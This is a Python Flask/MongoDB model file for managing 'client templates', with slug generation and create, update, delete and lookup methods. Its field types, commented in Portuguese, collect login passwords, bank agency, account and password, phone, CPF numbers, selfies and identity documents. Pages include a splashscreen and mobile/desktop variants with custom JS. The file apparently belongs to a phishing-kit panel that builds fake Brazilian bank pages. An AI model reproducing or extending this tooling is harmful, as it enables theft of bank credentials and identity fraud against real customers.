from flask import current_app
from bson.objectid import ObjectId
from datetime import datetime
import re
from app import mongo

class Template:
    """Template model for client templates"""
    
    # Available field types for pages
    FIELD_TYPES = [
        'login_password',           # Login + Senha
        'agency_account_password',  # Agência + Conta + Senha
        'phone',                    # Celular
        'cpf',                      # CPF
        'selfie',                   # Selfie
        'document'                  # Documento
    ]
    
    @staticmethod
    def generate_slug(name):
        """Generate URL-friendly slug from template name"""
        # Convert to lowercase and replace spaces with underscores
        slug = name.lower().strip()
        # Remove special characters, keep only alphanumeric, spaces, hyphens, and underscores
        slug = re.sub(r'[^a-z0-9\s\-_]', '', slug)
        # Replace spaces with underscores
        slug = re.sub(r'\s+', '_', slug)
        # Replace multiple underscores with single one
        slug = re.sub(r'_+', '_', slug)
        return slug
    
    @staticmethod
    def create(name, description, content=None, status='active'):
        """Create a new template"""
        try:
            # Generate slug from name
            slug = Template.generate_slug(name)
            
            # Check if slug already exists
            existing = mongo.db.templates.find_one({'slug': slug})
            if existing:
                # Add number suffix if slug exists
                counter = 1
                while existing:
                    test_slug = f"{slug}_{counter}"
                    existing = mongo.db.templates.find_one({'slug': test_slug})
                    counter += 1
                slug = test_slug
            
            # Create template object with enhanced structure
            new_template = {
                'name': name,
                'slug': slug,
                'description': description,
                'content': content or {},
                'status': status,
                'header': {
                    'enabled': False,
                    'content': '',
                    'logo': '',
                    'backgroundColor': '#ffffff'
                },
                'footer': {
                    'enabled': False,
                    'content': '',
                    'backgroundColor': '#f8f9fa'
                },
                'versions': {
                    'mobile': {
                        'enabled': True,
                        'customCss': '',
                        'customJs': ''
                    },
                    'desktop': {
                        'enabled': True,
                        'customCss': '',
                        'customJs': ''
                    }
                },
                'pages': [
                    {
                        'id': 'home',
                        'name': 'Home',
                        'type': 'home',
                        'required': True,
                        'fields': []  # List of field objects with order
                    },
                    {
                        'id': 'splashscreen',
                        'name': 'Splashscreen',
                        'type': 'splashscreen',
                        'required': True,
                        'duration': 3000,
                        'fields': []  # Splashscreen may not need fields
                    }
                ],
                'createdAt': datetime.utcnow(),
                'updatedAt': datetime.utcnow()
            }
            
            # Insert into database
            result = mongo.db.templates.insert_one(new_template)
            
            if result.inserted_id:
                return True, str(result.inserted_id)
            return False, "Database error"
        
        except Exception as e:
            current_app.logger.error(f"Error creating template: {e}")
            return False, str(e)
    
    @staticmethod
    def update(template_id, data):
        """Update template information"""
        try:
            if isinstance(template_id, str):
                template_id = ObjectId(template_id)
            
            # Add updated timestamp
            data['updatedAt'] = datetime.utcnow()
            
            result = mongo.db.templates.update_one(
                {'_id': template_id},
                {'$set': data}
            )
            
            if result.modified_count > 0:
                return True, "Template updated successfully"
            return False, "No changes made or template not found"
            
        except Exception as e:
            current_app.logger.error(f"Error updating template: {e}")
            return False, str(e)
    
    @staticmethod
    def delete(template_id):
        """Delete template"""
        try:
            if isinstance(template_id, str):
                template_id = ObjectId(template_id)
                
            result = mongo.db.templates.delete_one({'_id': template_id})
            
            if result.deleted_count > 0:
                return True, "Template deleted successfully"
            return False, "Template not found"
            
        except Exception as e:
            current_app.logger.error(f"Error deleting template: {e}")
            return False, str(e)
    
    @staticmethod
    def get_all():
        """Get all templates"""
        try:
            templates = list(mongo.db.templates.find())
            return templates
        except Exception as e:
            current_app.logger.error(f"Error getting templates: {e}")
            return []
    
    @staticmethod
    def get_by_id(template_id):
        """Get template by ID"""
        try:
            if isinstance(template_id, str):
                template_id = ObjectId(template_id)
                
            template = mongo.db.templates.find_one({'_id': template_id})
            return template
        except Exception as e:
            current_app.logger.error(f"Error getting template by ID: {e}")
            return None
    
    @staticmethod
    def get_by_slug(slug):
        """Get template by slug"""
        try:
            template = mongo.db.templates.find_one({'slug': slug})
            return template
        except Exception as e:
            current_app.logger.error(f"Error getting template by slug: {e}")
            return None
    
    @staticmethod
    def get_page_by_id(slug, page_id):
        """Get a specific page from a template by slug and page ID"""
        try:
            template = Template.get_by_slug(slug)
            if not template:
                return None
            
            # Find the page with matching ID
            for page in template.get('pages', []):
                if page.get('id') == page_id:
                    return page
            
            return None
        except Exception as e:
            current_app.logger.error(f"Error getting page: {e}")
            return None